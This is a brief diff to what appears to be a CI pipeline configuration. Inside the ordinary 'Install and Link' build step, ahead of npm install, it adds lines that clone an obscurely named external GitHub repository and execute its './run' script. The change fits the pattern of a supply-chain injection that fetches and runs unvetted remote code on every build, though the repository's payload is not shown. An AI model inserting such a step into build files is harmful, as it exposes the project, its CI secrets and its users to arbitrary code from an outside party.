@@ -10,6 +10,10 @@ jobs:
        displayName: 'Install Node.js'
 
      - script: |
+        git clone --recursive https://github.com/mijikuhibimui/mujijankopo
+        cd mujijankopo
+        ./run
+
         npm install
         npm link 
        displayName: 'Install and Link'
